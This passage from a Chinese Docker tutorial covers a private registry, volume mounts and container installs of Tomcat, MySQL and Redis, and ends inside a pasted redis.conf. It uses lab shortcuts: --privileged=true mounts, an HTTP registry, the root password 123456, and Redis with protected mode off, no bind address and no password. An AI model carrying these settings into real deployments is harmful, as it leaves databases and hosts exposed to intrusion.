a69d7c825c4f zzyyubuntu:1.2 启动我们的新镜像并和原来的对比 官网是默认下载的Ubuntu没有ifconfig命令。 我们自己commit构建的新镜像，新增加了ifconfig功能，可以成功使用。 6.2.4 curl验证私服库上有什么镜像 curl -XGET http://192.168.111.162:5000/v2/_catalog 可以看到，目前私服库没有任何镜像上传过。 6.2.5 将新镜像zzyyubuntu:1.2修改符合私服规范的Tag 按照公式： docker tag 镜像:Tag Host:Port/Repository:Tag 自己host主机IP地址，填写同学你们自己的，不要粘贴错误。 使用命令 docker tag 将zzyyubuntu:1.2 这个镜像修改为192.168.111.162:5000/zzyyubuntu:1.2 docker tag zzyyubuntu:1.2 192.168.111.162:5000/zzyyubuntu:1.2 6.2.6 修改配置文件使之支持http 别无脑照着复制，registry-mirrors 配置的是国内阿里提供的镜像加速地址，不用加速的话访问官网的会很慢。 2个配置中间有个逗号 ','别漏了，这个配置是json格式的。 vim命令新增如下红色内容：vim /etc/docker/daemon.json { “registry-mirrors”: [“https://aa25jngu.mirror.aliyuncs.com”], “insecure-registries”: [“192.168.111.162:5000”] } 上述理由：docker默认不允许http方式推送镜像，通过配置选项来取消这个限制。====&gt; 修改完后如果不生效，建议重启docker。 6.2.7 push推送到私服库 docker push 192.168.111.162:5000/zzyyubuntu:1.2 6.2.8 curl验证私服库上有什么镜像2 curl -XGET http://192.168.111.162:5000/v2/_catalog 6.2.9 pull到本地并运行 docker pull 192.168.111.162:5000/zzyyubuntu:1.2 docker run -it 镜像ID /bin/bash 7 Docker容器数据卷 7.1 坑：容器卷记得加入 --privileged=true Docker挂载主机目录访问如果出现cannot open directory .: Permission denied 解决办法：在挂载目录后多加一个–privileged=true参数即可 如果是CentOS7安全模块会比之前系统版本加强，不安全的会先禁止，所以目录挂载的情况被默认为不安全的行为，在SELinux里面挂载目录被禁止掉了，如果要开启，我们一般使用–privileged=true命令，扩大容器的权限解决挂载目录没有权限的问题，也即使用该参数，container内的root拥有真正的root权限，否则，container内的root只是外部的一个普通用户权限。 7.2 回顾下上一讲的知识点，参数V 7.3 是什么 卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File System提供一些用于持续存储或共享数据的特性：卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷。 一句话：有点类似我们Redis里面的rdb和aof文件。 将docker容器内的数据保存进宿主机的磁盘中，运行一个带有容器卷存储功能的容器实例。 docker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录 镜像名 7.4 能干嘛 将运用与运行的环境打包镜像，run后形成容器实例运行 ，但是我们对数据的要求希望是持久化的。 Docker容器产生的数据，如果不备份，那么当容器实例删除后，容器内的数据自然也就没有了。为了能保存数据在docker中我们使用卷。 特点： 数据卷可在容器之间共享或重用数据 卷中的更改可以直接实时生效，爽 数据卷中的更改不会包含在镜像的更新中 数据卷的生命周期一直持续到没有容器使用它为止 7.5 数据卷案例 7.5.1 宿主vs容器之间映射添加容器卷 直接命令添加 docker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录 镜像名 公式：docker run -it -v /宿主机目录:/容器内目录 ubuntu /bin/bash docker run -it --name myu3 --privileged=true -v /tmp/myHostData:/tmp/myDockerData ubuntu /bin/bash 查看数据卷是否挂载成功 docker inspect 容器ID 容器和宿主机之间数据共享 docker修改，主机同步获得 。 主机修改，docker同步获得。 docker容器stop，主机修改，docker容器重启看数据是否同步。 7.5.2 读写规则映射添加说明 读写(默认) docker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录:rw 镜像名 默认同上案例，默认就是rw rw = read + write 只读 容器实例内部被限制，只能读取不能写 /容器目录:ro 镜像名 就能完成功能，此时容器自己只能读取不能写 ro = read only 此时如果宿主机写入内容，可以同步给容器内，容器可以读取到。 docker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录:ro 镜像名 7.5.3 卷的继承和共享 容器1完成和宿主机的映射 docker run -it --privileged=true -v /mydocker/u:/tmp --name u1 ubuntu 容器2继承容器1的卷规则 docker run -it --privileged=true --volumes-from 父类 --name u2 ubuntu 8 Docker常规安装简介 8.1 总体步骤 搜索镜像 拉取镜像 查看镜像 启动镜像 - 服务端口映射 停止容器 移除容器 8.2 安装tomcat docker hub上面查找tomcat镜像 docker search tomcat 从docker hub上拉取tomcat镜像到本地 docker pull tomcat docker images查看是否有拉取到的tomcat 使用tomcat镜像创建容器实例(也叫运行镜像) docker run -it -p 8080:8080 tomcat -p 小写，主机端口:docker容器端口 -P 大写，随机分配端口 -i 交互 -t 终端 -d 后台 访问猫首页 问题 解决 可能没有映射端口或者没有关闭防火墙 把webapps.dist目录换成webapps 先成功启动tomcat 查看webapps 文件夹查看为空 免修改版说明 docker pull billygoo/tomcat8-jdk8 docker run -d -p 8080:8080 --name mytomcat8 billygoo/tomcat8-jdk8 8.3 安装mysql 8.3.1 docker hub上面查找mysql镜像 8.3.2 从docker hub上(阿里云加速器)拉取mysql镜像到本地标签为5.7 8.3.3 使用mysql5.7镜像创建容器(也叫运行镜像) 8.3.3.1 命令出处，哪里来的？ 8.3.3.2 简单版 使用mysql镜像 docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 docker ps docker exec -it 容器ID /bin/bash mysql -uroot -p 建库建表插入数据 外部Win10也来连接运行在dokcer上的mysql容器实例服务 问题 插入中文数据试试 为什么报错? docker上默认字符集编码隐患,docker里面的mysql容器实例查看，内容如下： SHOW VARIABLES LIKE 'character%' 删除容器后，里面的mysql数据怎么办？ 8.3.3.3 实战版 新建mysql容器实例 docker run -d -p 3306:3306 --privileged=true -v /bcxuse/mysql/log:/var/log/mysql -v /bcxuse/mysql/data:/var/lib/mysql -v /bcxuse/mysql/conf:/etc/mysql/conf.d -eMYSQL_ROOT_PASSWORD=123456 --name mysql mysql:5.7 新建my.cnf，通过容器卷同步给mysql容器实例 [client] default_character_set=utf8 [mysqld] collation_server = utf8_general_ci character_set_server = utf8 重新启动mysql容器实例再重新进入并查看字符编码 再新建库新建表再插入中文测试 结论 之前的DB 无效，修改字符集操作+重启mysql容器实例 之后的DB 有效，需要新建 结论：docker安装完MySQL并run出容器后，建议请先修改完字符集编码后再新建mysql库-表-插数据 假如将当前容器实例删除，再重新来一次，之前建的db01实例还有吗？try 8.4 安装redis 从docker hub上(阿里云加速器)拉取redis镜像到本地标签为6.0.8 入门命令 命令提醒：容器卷记得加入–privileged=true Docker挂载主机目录Docker访问出现cannot open directory .: Permission denied 解决办法：在挂载目录后多加一个–privileged=true参数即可 在CentOS宿主机下新建目录/app/redis mkdir -p /app/redis 将一个redis.conf文件模板拷贝进/app/redis目录下 将准备好的redis.conf文件放进/app/redis目录下 /app/redis目录下修改redis.conf文件 默认出厂的原始redis.conf # Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when memory size is needed, it is possible to specify # it in the usual form of 1k 5GB 4M and so forth: # # 1k =&gt; 1000 bytes # 1kb =&gt; 1024 bytes # 1m =&gt; 1000000 bytes # 1mb =&gt; 1024*1024 bytes # 1g =&gt; 1000000000 bytes # 1gb =&gt; 1024*1024*1024 bytes # # units are case insensitive so 1GB 1Gb 1gB are all the same. ################################## INCLUDES ################################### # Include one or more other config files here. This is useful if you # have a standard template that goes to all Redis servers but also need # to customize a few per-server settings. Include files can include # other files, so use this wisely. # # Notice option \"include\" won't be rewritten by command \"CONFIG REWRITE\" # from admin or Redis Sentinel. Since Redis always uses the last processed # line as value of a configuration directive, you'd better put includes # at the beginning of this file to avoid overwriting config change at runtime. # # If instead you are interested in using includes to override configuration # options, it is better to use include as the last line. # # include /path/to/local.conf # include /path/to/other.conf ################################## MODULES ##################################### # Load modules at startup. If the server is not able to load modules # it will abort. It is possible to use multiple loadmodule directives. # # loadmodule /path/to/my_module.so # loadmodule /path/to/other_module.so ################################## NETWORK ##################################### # By default, if no \"bind\" configuration directive is specified, Redis listens # for connections from all the network interfaces available on the server. # It is possible to listen to just one or multiple selected interfaces using # the \"bind\" configuration directive, followed by one or more IP addresses. # # Examples: # # bind 192.168.1.100 10.0.0.1 # bind 127.0.0.1 ::1 # # ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the # internet, binding to all the interfaces is dangerous and will expose the # instance to everybody on the internet. So by default we uncomment the # following bind directive, that will force Redis to listen only into # the IPv4 loopback interface address (this means Redis will be able to # accept connections only from clients running into the same computer it # is running). # # IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES # JUST COMMENT THE FOLLOWING LINE. # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #bind 127.0.0.1 # Protected mode is a layer of security protection, in order to avoid that # Redis instances left open on the internet are accessed and exploited. # # When protected mode is on and if: # # 1) The server is not binding explicitly to a set of addresses using the # \"bind\" directive. # 2) No password is configured. # # The server only accepts connections from clients connecting from the # IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain # sockets. # # By default protected mode is enabled. You should disable it only if # you are sure you want clients from other hosts to connect to Redis # even if no authentication is configured, nor a specific set of interfaces # are explicitly listed using the \"bind\" directive. protected-mode no # Accept connections on the specified port, default is 6379 (IANA #815344). # If port 0 is specified Redis will not listen on a TCP socket. port 6379 # TCP listen() backlog. # # In high requests-per-second environments you need an high backlog in order # to avoid slow clients connections issues. Note that the Linux kernel # will silently truncate it to the value of /proc/sys/net/core/somaxconn so # make sure to raise both the value of somaxconn and tcp_max_syn_backlog # in order to get the desired effect. tcp-backlog 511 # Unix socket. # # Specify the path for the Unix socket that will be used to listen for # incoming connections. There is no default, so Redis will not listen # on a unix socket when not specified. # # unixsocket /tmp/redis.sock # unixsocketperm 700 # Close the connection after a client is idle for N seconds (0 to disable) timeout 0 # TCP keepalive. # # If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence # of communication. This is useful for two reasons: # # 1) Detect dead peers. # 2) Take the connection alive from the point of view of network # equipment in the middle. # # On Linux, the specified value (in seconds) is the period used to send ACKs. # Note that to close the connection the double of the time is needed. # On other kernels the period depends on the kernel configuration. # # A reasonable value for this option is 300 seconds, which is the new # Redis default starting with Redis 3.2.1. tcp-keepalive 300 ################################# GENERAL ##################################### # By default Redis does not run as a daemon. Use 'yes' if you need it. # Note that Redis will write a pid file in /var/run/redis.pid when daemonized. daemonize no # If you run Redis from upstart or systemd, Redis can interact with your # supervision tree. Options: # supervised no - no supervision interaction # supervised upstart - signal upstart by putting Redis into SIGSTOP mode # supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET # supervised auto - detect upstart or systemd method based on # UPSTART_JOB or NOTIFY_SOCKET environment variables # Note: these supervision methods only signal \"process is ready.\" # They do not enable continuous liveness pings back to your supervisor. supervised no # If a pid file is specified, Redis writes it where specified at startup # and removes it at exit. # # When the server runs non daemonized, no pid file is created if none is # specified in the configuration. When the server is daemonized, the pid file # is used even if not specified, defaulting to \"/var/run/redis.pid\". # # Creating a pid file is best effort: if Redis is not able to create it # nothing bad happens, the server will start and run normally. pidfile /var/run/redis_6379.pid # Specify the server verbosity level. # This can be one of: # debug (a lot of information, useful for development/testing) # verbose (many rarely useful info, but not a mess like the debug level) # notice (moderately verbose, what you want in production probably) # warning (only very important / critical messages are logged) loglevel notice # Specify the log file name. Also the empty string can be used to force # Redis to log on the standard output. Note that if you use standard # output for logging but daemonize, logs will be sent to /dev/null logfile \"\" # To enable logging to the system logger, just set 'syslog-enabled' to yes, # and optionally update the other syslog parameters to suit your needs. # syslog-enabled no # Specify the syslog identity. # syslog-ident redis # Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7. # syslog-facility local0 # Set the number of databases. The default database is DB 0, you can select # a different one on a per-connection basis using SELECT &lt;dbid&gt; where # dbid is a number between 0 and 'databases'-1 databases 16 # By default Redis shows an ASCII art logo only when started to log to the # standard output and if the standard output is a TTY. Basically this means # that normally a logo is displayed only in interactive sessions. # # However it is possible to force the pre-4.0 behavior and always show a # ASCII art logo in startup logs by setting the following option to yes. always-show-logo yes ################################ SNAPSHOTTING ################################ # # Save the DB on disk: # # save &lt;seconds&gt; &lt;changes&gt; # # Will save the DB if both the given number of seconds and the given # number of write operations against the DB occurred. # # In the example below the behaviour will be to save: # after 900 sec (15 min) if at least 1 key changed # after 300 sec (5 min) if at least 10 keys changed # after 60 sec if at least 10000 keys changed # # Note: you can disable saving completely by commenting out all \"save\" lines. # # It is also possible to remove all the previously configured save # points by adding a save directive with a single empty string argument # like in the following example: # # save \"\" save 900 1 save 300 10 save 60 10000 # By default Redis will stop accepting writes if RDB snapshots are enabled # (at least one save point) and the latest background save failed. # This will make the user aware (in a hard way) that data is not persisting # on disk properly, otherwise chances are that no one will notice and some # disaster will happen. # # If the background saving process will start working again Redis will # automatically allow writes again. # # However if you have setup your proper monitoring of the Redis server # and persistence, you may want to disable this feature so that Redis will # continue to work as usual even if there are problems with disk, # permissions, and so forth. stop-writes-on-bgsave-error yes # Compress string objects using LZF when dump .rdb databases? # For default that's set to 'yes' as it's almost always a win. # If you want to save some CPU in the saving child set it to 'no' but # the dataset will likely be bigger if you have compressible values or keys. rdbcompression yes # Since version 5 of RDB a CRC64 checksum is placed at the end of the file. # This makes the format more resistant to corruption but there is a performance # hit to pay (around 10%) when saving and loading RDB files, so you can disable it # for maximum performances. # # RDB files created with checksum disabled have a checksum of zero that will # tell the loading code to skip the check. rdbchecksum yes # The filename where to dump the DB dbfilename dump.rdb # The working directory. # # The DB will be written inside this directory, with the filename specified # above using the 'dbfilename' configuration directive. # # The Append Only File will also be created inside this directory. # # Note that you must specify a directory here, not a file name. dir ./ ################################# REPLICATION ################################# # Master-Replica replication. Use replicaof to make a Redis instance a copy of # another Redis server. A few things to understand ASAP about Redis replication. # # +------------------+ +---------------+ # | Master | ---&gt; | Replica | # | (receive writes) | | (exact copy) | # +------------------+ +---------------+ # # 1) Redis replication is asynchronous, but you can configure a master to # stop accepting writes if it appears to be not connected with at least # a given number of replicas. # 2) Redis replicas are able to perform a partial resynchronization with the # master if the replication link is lost for a relatively small amount of # time. You may want to configure the replication backlog size (see the next # sections of this file) with a sensible value depending on your needs. # 3) Replication is automatic and does not need user intervention. After a # network partition replicas automatically try to reconnect to masters # and resynchronize with them. # # replicaof &lt;masterip&gt; &lt;masterport&gt; # If the master is password protected (using the \"requirepass\" configuration # directive below) it is possible to tell the replica to authenticate before # starting the replication synchronization process, otherwise the master will # refuse the replica request. # # masterauth &lt;master-password&gt; # When a replica loses its connection with the master, or when the replication # is still in progress, the replica can act in two different ways: # # 1) if replica-serve-stale-data is set to 'yes' (the default) the replica will # still reply to client requests, possibly with out of date data, or the # data set may just be empty if this is the first synchronization. # # 2) if replica-serve-stale-data is set to 'no' the replica will reply with # an error \"SYNC with master in progress\" to all the kind of commands # but to INFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG, # SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, # COMMAND, POST, HOST: and LATENCY. # replica-serve-stale-data yes # You can configure a replica instance to accept writes or not. Writing against # a replica instance may be useful to store some ephemeral data (because data # written on a replica will be easily deleted after resync with the master) but # may also cause problems if clients are writing to it because of a # misconfiguration. # # Since Redis 2.6 by default replicas are read-only. # # Note: read only replicas are not designed to be exposed to untrusted clients # on the internet. It's just a protection layer against misuse of the instance. # Still a read only replica exports by default all the administrative commands # such as CONFIG, DEBUG, and so forth. To a limited extent you can improve # security of read only replicas using 'rename-command' to shadow all the # administrative / dangerous commands. replica-read-only yes # Replication SYNC strategy: disk or socket. # # ------------------------------------------------------- # WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY # ------------------------------------------------------- # # New replicas and reconnecting replicas that are not able to continue the replication # process just receiving differences, need to do what is called a \"full # synchronization\". An RDB file is transmitted from the master to the replicas. # The transmission can happen in two different ways: # # 1) Disk-backed: The Redis master creates a new process that writes the RDB # file on disk. Later the file is transferred by the parent # process to the replicas incrementally. # 2) Diskless: The Redis master creates a new process that directly writes the # RDB file to replica sockets, without touching the disk at all. # # With disk-backed replication, while the RDB file is generated, more replicas # can be queued and served with the RDB file as soon as the current child producing # the RDB file finishes its work. With diskless replication instead once # the transfer starts, new replicas arriving will be queued and a new transfer # will start when the current one terminates. # # When diskless replication is used, the master waits a configurable amount of # time (in seconds) before starting the transfer in the hope that multiple replicas # will arrive and the transfer can be parallelized. # # With slow disks and fast (large bandwidth) networks, diskless replication # works better. repl-diskless-sync no # When diskless replication is enabled, it is possible to configure the delay # the server waits in order to spawn the child that transfers the RDB via socket # to the replicas. # # This is important since once the transfer starts, it is not possible to serve # new replicas arriving, that will be queued for the next RDB transfer, so the server # waits a delay in order to let more replicas arrive. # # The delay is specified in seconds, and by default is 5 seconds. To disable # it entirely just set it to 0 seconds and the transfer will start ASAP. repl-diskless-sync-delay 5 # Replicas send PINGs to server in a predefined interval. It's possible to change # this interval with the repl_ping_replica_period option. The default value is 10 # seconds. # # repl-ping-replica-period 10 # The following option sets the replication timeout for: # # 1) Bulk transfer I/O during SYNC, from the point of view of replica. # 2) Master timeout from the point of view of replicas (data, pings). # 3) Replica timeout from the point of view of masters (REPLCONF ACK pings). # # It is important to make sure that this value is greater than the value # specified for repl-ping-replica-period otherwise a timeout will be detected # every time there is low traffic between the master and the replica. # # repl-timeout 60 # Disable TCP_NODELAY on the replica socket after SYNC? # # If you select \"yes\" Redis will use a smaller number of TCP packets and # less bandwidth to send data to replicas. But this can add a delay for # the data to appear on the replica side, up to 40 milliseconds with # Linux kernels using a default configuration. # # If you select \"no\" the delay for data to appear on the replica side will # be reduced but more bandwidth will be used for replication. # # By default we optimize for low latency, but in very high traffic conditions # or when the master and replicas are many hops away, turning this to \"yes\" may # be a good idea. repl-disable-tcp-nodelay no # Set the replication backlog size. The backlog is a buffer that accumulates # replica data when replicas are disconnected for some time, so that when a replica # wants to reconnect again, often a full resync is not needed, but a partial # resync is enough, just passing the portion of data the replica missed while # disconnected. # # The bigger the replication backlog, the longer the time the replica can be # disconnected and later be able to perform a partial resynchronization. # # The backlog is only allocated once there is at least a replica connected. # # repl-backlog-size 1mb # After a master has no longer connected replicas for some time, the backlog # will be freed. The following option configures the amount of seconds that # need to elapse, starting from the time the last replica disconnected, for # the backlog buffer to be freed. # # Note that replicas never free the backlog for timeout, since they may be # promoted to masters later, and should be able to correctly \"partially # resynchronize\" with the replicas: hence they should always accumulate backlog. # # A value of 0 means to never release the backlog. # # repl-backlog-ttl 3600 # The replica priority is an integer number published by Redis in the INFO output. # It is used by Redis Sentinel in order to select a replica to promote into a # master if the master is no longer working correctly. # # A replica with a low priority number is considered better for promotion, so # for instance if there are three replicas with priority 10, 100, 25 Sentinel will # pick the one with priority 10, that is the lowest. # # However a special priority of 0 marks the replica as not able to perform the # role of master, so a replica with priority of 0 will never be selected by # Redis Sentinel for promotion. # # By default the priority is 100. replica-priority 100 # It is possible for a master to stop accepting writes if there are less than # N replicas connected, having a lag less or equal than M seconds. # # The N replicas need to be in \"online\" state. # # The lag in seconds, that must be &lt;= the specified value, is calculated from # the last ping received from the replica, that is usually sent every second. # # This option does not GUARANTEE that N replicas will accept the write, but # will limit the window of exposure for lost writes in case not enough replicas # are available, to the specified number of seconds. # # For example to require at least 3 replicas with a lag &lt;= 10 seconds use: # # min-replicas-to-write 3 # min-replicas-max-lag 10 # # Setting one or the other to 0 disables the feature. # # By default min-replicas-to-write is set to 0 (feature disabled) and # min-replicas-max-lag is set to 10. # A Redis master is able to list the address and port of the attached # replicas in different ways. For example the \"INFO replication\" section # offers this information, which is used, among other tools, by # Redis Sentinel in order to discover replica instances. # Another place where this info is available is in the output of the # \"ROLE\" command of a master. # # The listed IP and address normally reported by a replica is obtained # in the following way: # # IP: The address is auto detected by checking the peer address # of the socket used by the replica to connect with the master. # # Port: The port is communicated by the replica during the replication # handshake, and is normally the port that the replica is using to # listen for connections. # # However when port forwarding or Network Address Translation (NAT) is # used, the replica may be actually reachable via different IP and port # pairs. The following two options can be used by a replica in order to # report to its master a specific set of IP and port, so that both INFO # and ROLE will report those values. # # There is no need to use both the options if you need to override just # the port or the IP address. # # replica-announce-ip 5.5.5.5 # replica-announce-port 1234 ################################## SECURITY ################################### # Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other # commands. This might be useful in environments in which you do not trust # others with access to the host running redis-server. # # This should stay commented out for backward compatibility and because most # people do not need auth (e.g. they run their own servers). # # Warning: since Redis is pretty fast an outside user can try up to # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # # requirepass foobared # Command renaming. # # It is possible to change the name of dangerous commands in a shared # environment. For instance the CONFIG command may be renamed into something # hard to guess so that it will still be available for internal-use tools # but not available for general clients. # # Example: # # rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52 # # It is also possible to completely kill a command by renaming it into # an empty string: # # rename-command CONFIG \"\" # # Please note that changing the name of commands that are logged into the # AOF file or transmitted to replicas may cause problems. ################################### CLIENTS #################################### # Set the max number of connected clients at the same time. By default # this limit is set to 10000 clients, however if the Redis server is not # able to configure the process file limit to allow for the specified limit # the max number of allowed clients is set to the current file limit # minus 32 (as Redis reserves a few file descriptors for internal uses). # # Once the limit is reached Redis will close all the new connections sending # an error 'max number of clients reached'. # # maxclients 10000 ############################## MEMORY MANAGEMENT ################################ # Set a memory usage limit to the specified amount of bytes. # When the memory limit is reached Redis will try to remove keys # according to the eviction policy selected (see maxmemory-policy). # # If Redis can't remove keys according to the policy, or if the policy is # set to 'noeviction', Redis will start to reply with errors to commands # that would use more memory, like SET, LPUSH, and so on, and will continue # to reply to read-only commands like GET. # # This option is usually useful when using Redis as an LRU or LFU cache, or to # set a hard memory limit for an instance (using the 'noeviction' policy). # # WARNING: If you have replicas attached to an instance with maxmemory on, # the size of the output buffers needed to feed the replicas are subtracted # from the used memory count, so that network problems / resyncs will # not trigger a loop where keys are evicted, and in turn the output # buffer of replicas is full with DELs of keys evicted triggering the deletion # of more keys, and so forth until the database is completely emptied. # # In short... if you have replicas attached it is suggested that you set a lower # limit for maxmemory so that there is some free RAM on the system for replica # output buffers (but this is not needed if the policy is 'noeviction'). # # maxmemory &lt;bytes&gt; # MAXMEMORY POLICY: how Redis will select what to remove when maxmemory # is reached. You can select among five behaviors: # # volatile-lru -&gt; Evict using approximated LRU among the keys with an expire set. # allkeys-lru -&gt; Evict any key using approximated LRU. # volatile-lfu -&gt; Evict using approximated LFU among the keys with an expire set. # allkeys-lfu -&gt; Evict any key using approximated LFU. # volatile-random -&gt; Remove a random key among the ones with an expire set. # allkeys-random -&gt; Remove a random key, any key. # volatile-ttl -&gt; Remove the key with the nearest expire time (minor TTL) # noeviction -&gt; Don't evict anything, just return an error on write operations. # # LRU means Least Recently Used # LFU means Least Frequently Used # # Both LRU, LFU and volatile-ttl are implemented using approximated # randomized algorithms. # # Note: with any of the above policies, Redis will return an error on write # operations, when there are no suitable keys for eviction. # # At the date of writing these commands are: set setnx setex append # incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd # sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby # zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby # getset mset msetnx exec sort # # The default is: # # maxmemory-policy noeviction # LRU, LFU and minimal TTL algorithms are not precise algorithms but approximated # algorithms (in order to save memory), so you can tune it for speed or # accuracy. For default Redis will check five keys and pick the one that was # used less recently, you can change the sample size using the following # configuration directive. # # The default of 5 produces good enough results. 10 Approximates very closely # true LRU but costs more CPU. 3 is faster but not very accurate. # # maxmemory-samples 5 # Starting from Redis 5, by default a replica will ignore its maxmemory setting # (unless it is promoted to master after a failover or manually). It means # that the eviction of keys will be just handled by the master, sending the # DEL commands to the replica as keys evict in the master side. # # This behavior ensures that masters and replicas stay consistent, and is usually # what you want, however if your replica is writable, or you want the replica to have # a different memory setting, and you are sure all the writes performed to the # replica are idempotent, then you may change this default (but be sure to understand # what you are doing). # # Note that since the replica by default does not evict, it may end using more # memory than the one set via maxmemory (there are certain buffers that may # be larger on the replica, or data structures may sometimes take more memory and so # forth). So make sure you monitor your replicas and make sure they have enough # memory to never hit a real out-of-memory condition before the master hits # the configured maxmemory setting. # # replica-ignore-maxmemory yes ############################# LAZY FREEING #################################### # Redis has two primitives to delete keys. One is called DEL and is a blocking # deletion of the object. It means that the server stops processing new commands # in order to reclaim all the memory associated with an object in a synchronous # way. If the key deleted is associated with a small object, the time needed # in order to execute the DEL command is very small and comparable to most other # O(1) or O(log_N) commands in Redis. However if the key is associated with an # aggregated value containing millions of elements, the server can block for # a long time (even seconds) in order to complete the operation. # # For the above reasons Redis also offers non blocking deletion primitives # such as UNLINK (non blocking DEL) and the ASYNC option of FLUSHALL and # FLUSHDB commands, in order to reclaim memory in background. Those commands # are executed in constant time. Another thread will incrementally free the # object in the background as fast as possible. # # DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled. # It's up to the design of the application to understand when it is a good # idea to use one or the other. However the Redis server sometimes has to # delete keys or flush the whole database as a side effect of other operations. # Specifically Redis deletes objects independently of a user call in the # following scenarios: # # 1) On eviction, because of the maxmemory and maxmemory policy configurations, # in order to make room for new data, without going over the specified # memory limit. # 2) Because of expire: when a key with an associated time to live (see the # EXPIRE command) must be deleted from memory. # 3) Because of a side effect of a command that stores data on a key that may # already exist. For example the RENAME command may delete the old key # content when it is replaced with another one. Similarly SUNIONSTORE # or SORT with STORE option may delete existing keys. The SET command # itself removes any old content of the specified key in order to replace # it with the specified string. # 4) During replication, when a replica performs a full resynchronization with # its master, the content of the whole database is removed in order to # load the RDB file just transferred. # # In all the above cases the default is to delete objects in a blocking way, # like if DEL was called. However you can configure each case specifically # in order to instead release memory in a non-blocking way like if UNLINK # was called, using the following configuration directives: lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no ############################## APPEND ONLY MODE ############################### # By default Redis asynchronously dumps the dataset on disk. This mode is # good enough in many applications, but an issue with the Redis process or # a power outage may result into a few minutes of writes lost (depending on # the configured save points). # # The Append Only File is an alternative persistence mode that provides # much better durability. For instance using the default data fsync policy # (see later in the config file) Redis can lose just one second of writes in a # dramatic event like a server power outage, or a single write if something # wrong with the Redis process itself happens, but the operating system is # still running correctly. # # AOF and RDB persistence can be enabled at the same time without problems. # If the AOF is enabled on startup Redis will load the AOF, that is the file # with the better durability guarantees. # # Please check http://redis.io/topics/persistence for more information. appendonly no # The name of the append only file (default: \"appendonly.aof\") appendfilename \"appendonly.aof\" # The fsync() call tells the Operating System to actually write data on disk # instead of waiting for more data in the output buffer. Some OS will really flush # data on disk, some other OS will just try to do it ASAP. # # Redis supports three different modes: # # no: don't fsync, just let the OS flush the data when it wants. Faster. # always: fsync after every write to the append only log. Slow, Safest. # everysec: fsync only one time every second. Compromise. # # The default is \"everysec\", as that's usually the right compromise between # speed and data safety. It's up to you to understand if you can relax this to # \"no\" that will let the operating system flush the output buffer when # it wants, for better performances (but if you can live with the idea of # some data loss consider the default persistence mode that's snapshotting), # or on the contrary, use \"always\" that's very slow but a bit safer than # everysec. # # More details please check the following article: # http://antirez.com/post/redis-persistence-demystified.html # # If unsure, use \"everysec\". # appendfsync always appendfsync everysec # appendfsync no # When the AOF fsync policy is set to always or everysec, and a background # saving process (a background save or AOF log background rewriting) is # performing a lot of I/O against the disk, in some Linux configurations # Redis may block too long on the fsync() call. Note that there is no fix for # this currently, as even performing fsync in a different thread will block # our synchronous write(2) call. # # In order to mitigate this problem it's possible to use the following option # that will prevent fsync() from being called in the main process while a # BGSAVE or BGREWRITEAOF is in progress. # # This means that while another child is saving, the durability of Redis is # the same as \"appendfsync none\". In practical terms, this means that it is # possible to lose up to 30 seconds of log in the worst scenario (with the # default Linux settings). # # If you have latency problems turn this to \"yes\". Otherwise leave it as # \"no\" that is the safest pick from the point of view of durability. no-appendfsync-on-rewrite no # Automatic rewrite of the append only file. # Redis is able to automatically rewrite the log file implicitly calling # BGREWRITEAOF when the AOF log size grows by the specified percentage. # # This is how it works: Redis remembers the size of the AOF file after the # latest rewrite (if no rewrite has happened since the restart, the size of # the AOF at startup is used). # # This base size is compared to the current size. If the current size is # bigger than the specified percentage, the rewrite is triggered. Also # you need to specify a minimal size for the AOF file to be rewritten, this # is useful to avoid rewriting the AOF file even if the percentage increase # is reached but it is still pretty small. # # Specify a percentage of zero in order to disable the automatic AOF # rewrite feature. auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb # An AOF file may be found to be truncated at the end during the Redis # startup process, when the AOF data gets loaded back into memory. # This may happen when the system where Redis is running # crashes, especially when an ext4 filesystem is mounted without the # data=ordered option (however this can't happen when Redis itself # crashes or aborts but the operating system still works correctly). # # Redis can either exit with an error when this happens, or load as much # data as possible (the default now) and start if the AOF file is found # to be truncated at the end. The following option controls this behavior. # # If aof-load-truncated is set to yes, a truncated AOF file is loaded and # the Redis server starts emitting a log to inform the user of the event. # Otherwise if the option is set to no, the server aborts with an error # and refuses to start. When the option is set to no, the user requires # to fix the AOF file using the \"redis-check-aof\" utility before to restart # the server. # # Note that if the AOF file will be found to be corrupted in the middle # the server will still exit with an error. This option only applies when # Redis will try to read more data from the AOF file but not enough bytes # will be found. aof-load-truncated yes # When rewriting the AOF file, Redis is able to use an RDB preamble in the # AOF file for faster rewrites and recoveries. When this option is turned # on the rewritten AOF file is composed of two different stanzas: # # [RDB file][AOF tail] # # When loading Redis recognizes that the AOF file starts with the \"REDIS\" # string and loads the prefixed RDB file, and continues loading the AOF # tail. 